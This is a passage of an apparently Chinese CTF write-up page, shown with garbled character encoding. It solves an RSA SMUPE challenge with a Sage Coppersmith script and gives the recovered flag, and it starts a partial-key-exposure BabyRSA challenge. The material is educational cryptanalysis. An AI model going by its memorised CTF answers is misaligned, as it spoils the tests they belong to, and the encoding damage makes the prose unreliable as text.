flag</li></ol></blockquote><p>é¦–å…ˆå¯¹åŒä¸€ä¸ªæ¶ˆæ¯mè¿›è¡Œäº†å¤šæ¬¡åŠ å¯†ï¼Œè™½ç„¶è¿™é‡Œå¯¹mè¿›è¡Œäº†çº¿æ€§å¡«å……ï¼Œæ— æ³•ç›´æ¥ä½¿ç”¨ä¸­å›½å‰©ä½™å®šç†ï¼Œä½†æ˜¯æœ‰å¤šç»„å¯†æ–‡ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥æ±‚è§£ï¼Œè¿™ä¹Ÿå°±æ˜¯SMUPEé—®é¢˜ã€‚åœ¨è¿™é¢˜ä¸­ï¼Œæˆ‘ä»¬å…ˆè¿›è¡Œäº†é¢„å¤„ç†ï¼ˆå‚è€ƒxennyå¸ˆå‚…ï¼‰ï¼Œç„¶åè°ƒç”¨äº†smupeå‡½æ•°è¿›è¡Œæ±‚è§£ã€‚</p><p>æ ¹æ® Alexander May and Maike Ritzenhofen äº 2008 å¹´çš„ç»“è®ºï¼Œå¯¹äº SMUPE-problemï¼ˆä¹Ÿå°±æ˜¯è¿™é¢˜çš„é—®é¢˜ï¼‰ï¼Œå½“ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></msubsup><mfrac><mn>1</mn><msub><mi>e</mi><mi>i</mi></msub></mfrac><mo>&gt;</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\sum_{i=1}^k \frac{1}{e_i} &gt; 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4341079999999997em;vertical-align:-0.44509999999999994em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9890079999999999em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span> æ—¶å¯è§£ã€‚æ‰€ä»¥æˆ‘ä»ç„¶å€ŸåŠ©äº†xennyå¸ˆå‚…çš„é¢„å¤„ç†ï¼Œåˆ©ç”¨x_changeå‡½æ•°æ±‚è§£æ»¡è¶³æ¡ä»¶çš„å‡ ç»„å¯†æ–‡ã€‚</p><p>1ã€è®¡ç®—N</p><p>2ã€åˆ©ç”¨CRTè®¡ç®—T[j]ï¼Œåœ¨åŸç†è§£é‡Šè¯´t[i]=1 if i=j, t[i]=0 if iâ‰ jï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œå°±ä¾è‘«èŠ¦ç”»ç“¢äº†ã€‚</p><p>3ã€å»ºç«‹åœ¨Nä¸‹çš„æ¨¡å¤šé¡¹å¼</p><p>4ã€æ ¹æ®åŠ å¯†ä½¿ç”¨çš„çº¿æ€§å¡«å……ï¼Œè®¡ç®—giï¼Œé¡ºä¾¿ä¹˜ä¸ŠT[j]</p><p>5ã€monicå°†gçš„é¦–é¡¹è½¬ä¸º1</p><p>6ã€æœ€åé€šè¿‡small_rootsæ±‚è§£m</p><h2 id="exp-19"><a class="markdownIt-Anchor" href="#exp-19"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">import</span> gmpy2<br><br>_sage_const_1 = Integer(<span class="hljs-number">1</span>);<br>_sage_const_0 = Integer(<span class="hljs-number">0</span>);<br>_sage_const_1p = RealNumber(<span class="hljs-string">&#x27;1.&#x27;</span>);<br>_sage_const_1000 = Integer(<span class="hljs-number">1000</span>);<br>_sage_const_7p = RealNumber(<span class="hljs-string">&#x27;7.&#x27;</span>);<br>_sage_const_8 = Integer(<span class="hljs-number">8</span>);<br>_sage_const_2 = Integer(<span class="hljs-number">2</span>)<br>__author__ = <span class="hljs-string">&#x27;x3nny&#x27;</span><br>x_calc = <span class="hljs-keyword">lambda</span> x, n: ((n - x) // x + _sage_const_1, (n - x) % x)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">x_change</span>(<span class="hljs-params">e_list</span>):<br>    e_list = [(i, e_list[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(e_list))]<br>    e_list = <span class="hljs-built_in">sorted</span>(e_list, key=<span class="hljs-keyword">lambda</span> x: x[_sage_const_1])<br>    <span class="hljs-built_in">sum</span> = max_i = _sage_const_0<br>    indexs = []<br>    exponents = []<br>    <span class="hljs-keyword">for</span> index, exp <span class="hljs-keyword">in</span> e_list:<br>        <span class="hljs-built_in">sum</span> += _sage_const_1 / exp<br>        indexs.append(index)<br>        <span class="hljs-keyword">if</span> exp &gt; max_i:<br>            max_i = exp<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span> &gt; _sage_const_1p:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(indexs)):<br>        exponents.append(x_calc(e_list[i][_sage_const_1], max_i))<br>    <span class="hljs-keyword">return</span> indexs, exponents<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">modinv</span>(<span class="hljs-params">a, m</span>):<br>    <span class="hljs-keyword">return</span> gmpy2.invert(gmpy2.mpz(a), gmpy2.mpz(m))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CRT</span>(<span class="hljs-params">n, a</span>):<br>    N = reduce(<span class="hljs-keyword">lambda</span> x, y: x * y, n)<br>    result = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> n_i, a_i <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(n, a):<br>        p = N / n_i<br>        s = modinv(p, n_i)<br>        result += a_i * s * p<br>    <span class="hljs-keyword">return</span> result % N<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">smupe</span>(<span class="hljs-params">c_list, n_list, a_list, b_list, e_list, bits=_sage_const_1000, beta=_sage_const_7p / _sage_const_8</span>):<br>    indexs, exponents = x_change(e_list)<br>    <br>    N = reduce(<span class="hljs-keyword">lambda</span> x, y: x * y, [n_list[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> indexs])<br>    <br>    T=[]<br>    n=[]<br>    tj=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(indexs)):<br>        n.append(n_list[indexs[i]])<br>        tj.append([<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(indexs))])<br>        tj[i][i]=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(indexs)):<br>        T.append(CRT(n,tj[i]))<br>        <br>    P.&lt;x&gt; = PolynomialRing(Zmod(N))<br>    g=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(indexs)):<br>        g+=((a_list[indexs[i]] * x + b_list[indexs[i]]) ** e_list[indexs[i]] - c_list[indexs[i]])*T[i]<br>    g = g.monic()<br>    m=g.small_roots(X=<span class="hljs-number">2</span>**bits, beta=beta)<br>    <span class="hljs-keyword">if</span> m:<br>        <span class="hljs-keyword">return</span> m[_sage_const_0]<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br>Invitation1 = <span class="hljs-number">2726880165485794753015221799903015469859604350960070462389832770775190258204902795671085685627736110579803076064313238826997962227132535666379117171603278182417820587346210511971127809627876548907651538393737303011542136469304569045407566630840981287558726831003180186144633381044057099863505591978316576331</span> <br>Invitation2 = <span class="hljs-number">52844103418322232725177561034428083147725292376614668718220523666259095447694889972949103379829470432332480992707892007073319952276490981511612735696207090391646476749895265951654074573797235607971038590694835782189124391368712277613425337912212240432011011071881837734857743183367019103096901117395938690572</span> <br>Invitation3 = <span class="hljs-number">129274519334082165644106292383763271862424981496822335330342328217347928093592453953990448827969549377883054831490973006383371688359344675312001881631556371220779971357039899721241880304156884612458373310254854821837978876725801047977081900824202659636258168216028784656056334358157381820784576207338479493823</span> <br>Invitation4 = <span class="hljs-number">56852637683122735164568970875066131746509133403072354742812890131597805562226047560392266004050592533316793038372256396537829143627478792510526346644756590135871716813976819138793368813440386409129373327577756689416990858633825538766694242123021009535005392002648416127869437948525458000795891155650312894218</span> <br>Invitation5 = <span class="hljs-number">24933581882539143383805596779774030477763512752520375486982562296903063067503747125713029403793101373585417342942950790457235350083784905974251188305010098928244056980941419687746319300184530161551239060873604405554973757867815783641391659818219177575212360602858057667033472530286856616676363511656764861866</span> <br>Invitation6 = <span class="hljs-number">7491476722927235473944826192371870577426352529433316210668760004930228302472920679959949471665143237333356259221787618020560963460668303766902416340056446225333025453011937952801159044781738493694911250765543392959285625650198325627539546777165439291150376527665779894748453633305704694635029402487576286720</span> <br>Invitation7 = <span class="hljs-number">46994515206702516116723205176259615067102717099690856936455392000070823814544052445278146449282379251128163008476565339875497253781717590664182753552262233895322322657625202522815172174432182181682631558679857615390973133346476079858014623412440411395083299226947371458955797627789607079672039131280242758091</span> <br>Invitation8 = <span class="hljs-number">8140023566779187828652447593867705813386781164538611122714708931585587727699213769519135028841126072130625547328311301696554048174772606261707345115571968105138543476580875347239912760797035694220505996377127309341770427102697008350472060971360460756799310951343070384766137332401117333917901167639276168214</span> <br>Invitation9 = <span class="hljs-number">8385766476371753553977800353128766303065572190592509929058486984964439147256960481698015327599879810752997804957814193113184978479627127131318723231581432235920975812354556190022727375961505764199831794239507708621401077801662954349957627630157786326057704380977697746043041515978455150985893713987598581167</span> <br>Invitation10 = <span class="hljs-number">25434511525127530194830986592289179576070740435049947678930286998924519588985583799757299734846614343604661534391991096353170465467791358514448923161460366596251448937540153262731348684727026598527904328268639060306102090278287818149679940661579357649191023269947102746200467430583428889484549034314463114080</span> <br>Invitation11 = <span class="hljs-number">9435583236354598287661880148272717764447540972316605192855157484524753847806158586224733743434644389385148450722945845355791145016665856388503878165725148745517696840251674049929524448078129458846254866804153080766917319923905682824180976106679633180818527967145571143203594244851742143986040226240019541346</span> <br>Invitation12 = <span class="hljs-number">42653412322252936189967169320174001935456500265020295381235749570735595316912049949245536609634786767873783560657460914097412643705264107040560389003526999720357122717443215007182355846769697457076620951388839672721527406861414375682603373503445636748304326212654026233985520038237509837611802457243967916967</span> <br>Invitation13 = <span class="hljs-number">50163996128508874413636370533324079468893191391677157815578286348174669089976633631417431754505804284298354381223186985949160012660340790440711469708712479223582014168361667639570586425626182863344576254691662799762136734638820942002509860333817967414572002225418810272184173820322912928927789061077468994953</span> <br>Invitation14 = <span class="hljs-number">55181712049788569218094734913693030675622116883683701002270524678292896232044695586872582672159854063365203462010143885417632291300773699604618481578372258936513301821561273604986211363808846581429372811764533701610119228124866223770584249909429743735157839245622925997548481946831963456454939343358587988983</span> <br><br>e1,N1 = [<span class="hljs-number">5</span>,<span class="hljs-number">90361246179367799606636863352077187566064794796456461177972505143929614628873639223638940051613378291778175724735519020067052934403115774679961661481160141872257338930620863078688082915958381094674423803586734810828570206667419458295735288184697613296663226516640069281835035704453280781694226293902395215269</span>]<br>e2,N2 = [<span class="hljs-number">5</span>,<span class="hljs-number">83202136479583179143205059354864808364257451670037867814548678142629716115373207061455185843132942837300718212806534861585785041547496145915392175827479376792813058845422044909477892978293495048968520853100992244672416436363272286740068846609018921112995562647093952700070707124842514243806528982910520604851</span>]<br>e3,N3 = [<span class="hljs-number">3</span>,<span class="hljs-number">146694460234280339612721415368435987068740712812770728817136582256341063038147863645902264969297892447333024201649306207442798919845916187823646745721109151386096190207317810424580842120750075213595282979568495342617919336417068886973047979116994072272482630372638964064972815256237040541007947708358680368391</span>]<br>e4,N4 = [<span class="hljs-number">7</span>,<span class="hljs-number">145212137982314671207105886550619275956842416412937060552686822638155412950680057688522218990023473104787006548449644240065948769143660097622695125682017688804838701293738298008178105057147539522368965730223561911750657089352591376219016726977232279206451303896573325330139830440927228125810665303608828462177</span>]<br>e5,N5 = [<span class="hljs-number">5</span>,<span class="hljs-number">69335368232766044823545542187513771534967902179150417021053554241638095909666122935053210964003511014870892979205875153115719406287728162111662254890513324436473313860142126335197489227724691042286796058111753972895113145188906829975189506125997319609609974126645475084944238417929532560409919420929255247813</span>]<br>e6,N6 = [<span class="hljs-number">5</span>,<span class="hljs-number">93889543065608951579836429313520485233295158467296710329997599807630401722519056218864031741675898621375735347229494633577571323057785261271373295860331130588582231771193563731092603614818963592931492474988532068227153492022582339704874613690044001529412669510094771064646843676765163737757104643318364446839</span>]<br>e7,N7 = [<span class="hljs-number">7</span>,<span class="hljs-number">66174700839404221060785862467924299511645570336361033287335855493589093141782896451863402373425798838446538369142584932156150350565382116869446083154097803842190010954019565857767923584979615770650706675094209251111816761431713779074557571353022624477001770694207393369796369620048999514683357963227119554487</span>]<br>e8,N8 = [<span class="hljs-number">3</span>,<span class="hljs-number">65031485534704406281490718325237831433086480239135617407356760819741796565231283220528137697949585150709734732370203390254643835828984376427852793969716489016520923272675090536677771074867975287284694860155903327351119710765174437247599498342292671117884858621418276613385329637307269711179183430246951756029</span>]<br>e9,N9 = [<span class="hljs-number">5</span>,<span class="hljs-number">72454311940971803130612024751128556938725737742029062979349607787083978826668706819793864356790325653817555839762732164812521831864626411495002267399139766907846534945632792910468487287154661692733986224962564621615361536373173705359255153606552352581704159462310354407361311378558150604159961029937052901709</span>]<br>e10,N10 = [<span class="hljs-number">3</span>,<span class="hljs-number">126172075578367446151297289668746433680600889845504078949758568698284471307000358407453139846282095477016675769468273204536898117467559575203458221600341760844973676129445394999861380625435418853474246813202182316736885441120197888145039130477114127079444939102267586634051045795627433724810346460217871661901</span>]<br>e11,N11 = [<span class="hljs-number">3</span>,<span class="hljs-number">75691424835079457343374072990750986689075078863640186724151061449621926239051140991748483370587430224317778303489124525034113533087612981452189061743589227565099659070008017454957304620495920813121234552401715857719372861565651204968408267740732475458128601061676264465241188491988485848198323410127587280471</span>]<br>e12,N12 = [<span class="hljs-number">7</span>,<span class="hljs-number">88063052818271125442049408332053226451497067720511502513828848476569985821115735898897947439175727789641390104005400308936768495751619165683456550165811034670341697022370415202614387373196086237042577737857259724530596416810462125219296930758592032765843338961894697491961439584875235274163072466474940670589</span>]<br>e13,N13 = [<span class="hljs-number">5</span>,<span class="hljs-number">86478932133708863968749977073639049451666195461247968321317885106346907736572028122496476049748246757185316498949163898915427948597498506162230927380667345132742891001640364064647368394822175742973968167028656790729030556005407153405955458636780270673780720333871959638216946584461925553782697695137132507853</span>]<br>e14,N14 = [<span class="hljs-number">7</span>,<span class="hljs-number">137641493263428303662262187582231235637921833879366309318941383348412296182252654397496377642861646991438721153462001357875169325595544056465299787575422581289053630686684843044593163904089201855371863459503176022957832807726507152235818181000484878683030989944063049622694810207054366378176225221479695833371</span>]<br><br>e = []<br>n = []<br>c = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>):<br>    e.append(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;e%d&#x27;</span> % (i+<span class="hljs-number">1</span>)))<br>    n.append(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;N%d&#x27;</span> % (i+<span class="hljs-number">1</span>)))<br>    c.append(<span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;Invitation%d&#x27;</span> % (i+<span class="hljs-number">1</span>)))<br>flag=<span class="hljs-string">b&#x27;GWTH&#123;&#x27;</span>+<span class="hljs-string">b&#x27;x&#x27;</span>*<span class="hljs-number">49</span><br>flag=bytes_to_long(flag)<br>bits=flag.bit_length()<br>b = [(i+<span class="hljs-number">1</span>)*(<span class="hljs-number">3</span>**bits) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>)]<br>a = [<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>)]<br>m = smupe(c, n, a, b, e_list=e)<br><span class="hljs-built_in">print</span>(long_to_bytes(iroot(<span class="hljs-built_in">int</span>(m), <span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]))<br><br><span class="hljs-comment">#b&#x27;GWHT&#123;e959e3f8e7242954b43e1b91de9886e1&#125;Welc0metomyp4rty&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;e959e3f8e7242954b43e1b91de9886e1&#125;</span><br></code></pre></td></tr></table></figure><h1 id="é¹¤åŸæ¯-2021babyrsa"><a class="markdownIt-Anchor" href="#é¹¤åŸæ¯-2021babyrsa"></a> [é¹¤åŸæ¯ 2021]BabyRSA</h1><h2 id="é¢˜ç›®-20"><a class="markdownIt-Anchor" href="#é¢˜ç›®-20"></a> é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, bytes_to_long<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>e = <span class="hljs-number">65537</span><br>hint1 = p &gt;&gt; <span class="hljs-number">724</span><br>hint2 = q % (<span class="hljs-number">2</span> ** <span class="hljs-number">265</span>)<br>ct = <span class="hljs-built_in">pow</span>(bytes_to_long(flag), e, n)<br><span class="hljs-built_in">print</span>(hint1)<br><span class="hljs-built_in">print</span>(hint2)<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-built_in">print</span>(ct)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479</span><br><span class="hljs-string">40812438243894343296354573724131194431453023461572200856406939246297219541329623</span><br><span class="hljs-string">21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969</span><br><span class="hljs-string">19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-20"><a class="markdownIt-Anchor" href="#åˆ†æ-20"></a> åˆ†æ</h2><p>å…ˆæ”¾ä¸€ç¯‡æ–‡ç« ï¼Œè®²å¾—æ¯”è¾ƒå¥½</p><blockquote><p><a href="https://blog.csdn.net/qq_51999772/article/details/123620932">RSAä¸­coppersmithå®šç†çš„åº”ç”¨æ¡ä»¶_sagemath coppersmith-CSDNåšå®¢</a></p></blockquote><p>æˆ‘ä»¬çŸ¥é“pçš„é«˜300ä½ï¼Œå’Œqçš„ä½265ä½</p><p>ç»è¿‡è®¡ç®—</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>p</mi><mo>âˆ—</mo><mi>q</mi><mo>=</mo><mi>n</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mn>265</mn></msup><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msub><mi>p</mi><mi>l</mi></msub><mo>âˆ—</mo><msub><mi>q</mi><mi>l</mi></msub><mo>=</mo><mi>n</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mn>265</mn></msup><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msub><mi>p</mi><mi>l</mi></msub><mo>=</mo><mi>n</mi><mo>âˆ—</mo><msubsup><mi>q</mi><mi>l</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msubsup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mn>265</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p*q=n\quad mod(2^{265})\\p_l*q_l=n\quad mod(2^{265})\\p_l=n*q_l^{-1}\quad mod(2^{265})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord 